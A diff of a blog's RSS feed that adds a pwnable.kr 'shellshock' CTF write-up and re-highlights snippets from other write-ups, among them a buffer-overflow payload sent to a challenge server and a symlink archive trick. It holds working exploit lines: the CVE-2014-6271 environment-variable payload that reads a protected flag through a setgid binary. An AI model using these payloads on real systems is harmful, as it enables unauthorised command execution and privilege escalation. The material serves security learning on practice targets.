@@ -7,6 +7,112 @@
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
     
       <item>
+        <title>Pwnable.kr - shellshock</title>
+        <description>&lt;p&gt;Today I’m going to show you how to exploit a vulnerability in &lt;strong&gt;&lt;em&gt;shellschock&lt;/em&gt;&lt;/strong&gt;  challenge from &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;solution&quot;&gt;Solution&lt;/h3&gt;
+
+&lt;p&gt;Firstly we’ll have to connect via &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; to the server hosting this challenge.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;main:~ &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ssh shellshock@pwnable.kr &lt;span class=&quot;nt&quot;&gt;-p2222&lt;/span&gt;
+shellshock@pwnable.krs password:
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;  |__|  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; /    &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| |      /  _]    |  |/ &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;|    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  o  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;| |     /  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_     |  &lt;span class=&quot;s1&quot;&gt;' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /
+|  |  |  `  '&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  _  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  O  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;_  __ |     &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;    &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|  |   &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;     / |  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  |  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+|__|    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;/  |__|__||__|__||_____||_____||_____||__||__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;|
+
+- Site admin : daehee87.kr@gmail.com
+- IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
+- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;join &lt;/span&gt;IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
+Last login: Fri Jan 19 07:08:33 2018 from 46.164.98.87
+shellshock@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 980
+drwxr-x---  5 root shellshock       4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 87 root root             4096 Dec 27 23:17 ..
+&lt;span class=&quot;nt&quot;&gt;-r-xr-xr-x&lt;/span&gt;  1 root shellshock     959120 Oct 12  2014 bash
+d---------  2 root root             4096 Oct 12  2014 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 root shellshock_pwn     47 Oct 12  2014 flag
+dr-xr-xr-x  2 root root             4096 Oct 12  2014 .irssi
+drwxr-xr-x  2 root root             4096 Oct 23  2016 .pwntools-cache
+&lt;span class=&quot;nt&quot;&gt;-r-xr-sr-x&lt;/span&gt;  1 root shellshock_pwn   8547 Oct 12  2014 shellshock
+&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;  1 root root              188 Oct 12  2014 shellshock.c&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;From now on, we’re ready to play with the challenge. First thing I notice is that flag is only accessible by user &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock_pwn&lt;/code&gt;, other than my user called &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock&lt;/code&gt;. But luckily, the binary is also using &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock_pwn&lt;/code&gt; GID. Then, following my usual steps, I decide to check out the source code.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;setresuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;setresgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getegid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/home/shellshock/bash -c 'echo shock_me'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In order to check what &lt;code class=&quot;highlighter-rouge&quot;&gt;setresgid&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;setresuid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;getegid&lt;/code&gt; are I decided to look at the &lt;strong&gt;&lt;em&gt;man pages&lt;/em&gt;&lt;/strong&gt; for these functions. Here’s the quick walkthrough.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;setresuid() sets the real user ID, the effective user ID, and the
+saved set-user-ID of the calling process.
+
+An  unprivileged  process may change its real UID, effective UID,
+and saved set-user-ID, each to one of: the current real UID,  the
+current effective UID or the current saved set-user-ID.
+
+A  privileged  process (on Linux, one having the CAP_SETUID capa‐
+bility) may set its real UID, effective UID, and saved  set-user-
+ID to arbitrary values.
+
+If one of the arguments equals -1, the corresponding value is not
+changed
+
+Completely analogously, setresgid() sets the real GID,  effective
+GID,  and  saved  set-group-ID of the calling process (and always
+modifies the filesystem GID to be the same as the effective GID),
+with the same restrictions for unprivileged processes.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;The getegid() function shall return the effective group ID of the
+calling process&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In the other words, this program will run with the group ID of the owner, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;shellshock_pwn&lt;/code&gt;. Just as the ID of the flag. That’s good news.&lt;/p&gt;
+
+&lt;p&gt;Now let’s look at the challenge name once again. Shellshock is the name of the vulnerability disclosed on 24 September 2014. It allows an attacker to execute arbitrary commands on the vulnerable versions of bash.&lt;/p&gt;
+
+&lt;p&gt;Vulnerability can be tested with the following command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;env &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'() { :;}; echo vulnerable'&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;echo this is a test&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can use the snippet to perform our own shellshock on this vulnerable binary. Firstly, let’s modify this command to view the flag for us.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;() { :;}; /bin/cat flag &quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Export is only used to save the variable, and then run the binary - just like that.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;shellshock@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;() { :;}; /bin/cat flag &quot;&lt;/span&gt;
+shellshock@ubuntu:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./shellshock
+only &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h3 id=&quot;tools-used&quot;&gt;Tools used&lt;/h3&gt;
+&lt;p&gt;No external tools used.&lt;/p&gt;
+
+&lt;h3 id=&quot;referencenotes&quot;&gt;Reference/notes&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_software_bug&quot;&gt;https://en.wikipedia.org/wiki/Shellshock_software_bug&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf&quot;&gt;https://www.owasp.org/images/1/1b/Shellshock_-_Tudor_Enache.pdf&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://seclists.org/oss-sec/2014/q3/650&quot;&gt;http://seclists.org/oss-sec/2014/q3/650&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://blog.cloudflare.com/inside-shellshock/&quot;&gt;https://blog.cloudflare.com/inside-shellshock/&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 19 Jan 2018 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/pwnable.kr-shellshock/</link>
+        <guid isPermaLink="true">http://localhost:4000/pwnable.kr-shellshock/</guid>
+      </item>
+    
+      <item>
         <title>34C3 Junior CTF - spi</title>
         <description>&lt;p&gt;This time we’re going to look at quite interesting challenge from &lt;strong&gt;&lt;em&gt;34C3 Junior CTF&lt;/em&gt;&lt;/strong&gt;  called &lt;strong&gt;&lt;em&gt;spi&lt;/em&gt;&lt;/strong&gt;, with a little bit of backstory.&lt;/p&gt;
 &lt;ul&gt;
@@ -223,7 +329,7 @@ We added a flag for your convenience.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;After a while I found out that we can simply compress &lt;strong&gt;&lt;em&gt;symlinks&lt;/em&gt;&lt;/strong&gt;, which will allow us to enter a file linked by the content of an archive. Let’s create this file.&lt;/p&gt;
 
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ln &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ../../flag.php ./symlink.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; ../../flag.php ./symlink.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
 &lt;p&gt;Now we’re able to compress it and send to the web service.&lt;/p&gt;
 
@@ -273,7 +379,7 @@ mistake@pwnable.krs password:
 
 - Site admin : daehee87.kr@gmail.com
 - IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
-- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
+- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;join &lt;/span&gt;IRC now
 - files under /tmp can be erased anytime. make your directory under /tmp
 - to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
 Last login: Thu Dec 28 05:48:19 2017 from 93.234.107.184
@@ -327,8 +433,8 @@ drwxr-xr-x  2 root        root    4096 Oct 23  2016 .pwntools-cache&lt;/code&gt;
 	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input password : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%10s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
-	&lt;span class=&quot;c1&quot;&gt;// xor your input
-&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;// xor your input&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;xor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pw_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw_buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PW_LEN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password OK&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -462,8 +568,8 @@ drwxr-xr-x  2 root       root   4096 Oct 23  2016 .pwntools-cache
 &lt;/span&gt;
 &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// random value!
-&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// random value!&lt;/span&gt;
+
 	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%d&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
@@ -502,7 +608,7 @@ int main(){
 test.c:5:18: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘rand’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Wimplicit-function-declaration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
          random &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; rand&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                   ^
-random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;chmod +x &lt;span class=&quot;nb&quot;&gt;test
+random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;test
 &lt;/span&gt;random@ubuntu:/tmp/random_test&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test
 1804289383&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
@@ -635,8 +741,8 @@ Is that true?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
 	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// smash me!
-&lt;/span&gt;	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;	&lt;span class=&quot;c1&quot;&gt;// smash me!&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -742,8 +848,8 @@ helloworld
 &lt;p&gt;Ready to exploit?&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;w3ndige@main ~ % &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python2 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print 52*'A'+'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;be&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ba&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;fe&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ca'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | nc pwnable.kr 9000
-whoami
-bof
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;bof
 &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
 total 25060
 drwxr-x---  3 root bof      4096 Oct 23  2016 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
@@ -786,7 +892,7 @@ col@pwnable.krs password:
 
 - Site admin : daehee87.kr@gmail.com
 - IRC : irc.netgarage.org:6667 / &lt;span class=&quot;c&quot;&gt;#pwnable.kr&lt;/span&gt;
-- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to join IRC now
+- Simply &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;irssi&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;to &lt;span class=&quot;nb&quot;&gt;join &lt;/span&gt;IRC now
 - files under /tmp can be erased anytime. make your directory under /tmp
 - to use peda, issue &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; /usr/share/peda/peda.py&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;gdb terminal
 Last login: Fri Nov 24 12:21:39 2017 from 24.16.85.95
@@ -872,93 +978,6 @@ daddy! I just managed to create a &lt;span class=&quot;nb&quot;&gt;hash &lt;/spa
         <pubDate>Fri, 24 Nov 2017 08:00:00 +0000</pubDate>
         <link>http://localhost:4000/pwnable.kr-collision/</link>
         <guid isPermaLink="true">http://localhost:4000/pwnable.kr-collision/</guid>
-      </item>
-    
-      <item>
-        <title>Pwnable.kr - fd</title>
-        <description>&lt;p&gt;After feeling a big need to improve my knowledge of &lt;em&gt;pwnable&lt;/em&gt; category, I decided  to check out &lt;a href=&quot;http://pwnable.kr&quot; title=&quot;pwnable.kr&quot;&gt;pwnable.kr&lt;/a&gt; and start from the beginning.&lt;/p&gt;
-
-&lt;p&gt;Here comes the &lt;strong&gt;&lt;em&gt;Toddler’s Bottle&lt;/em&gt;&lt;/strong&gt; and the first challenge - &lt;strong&gt;&lt;em&gt;fd&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Mommy! what is a file descriptor in Linux?&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
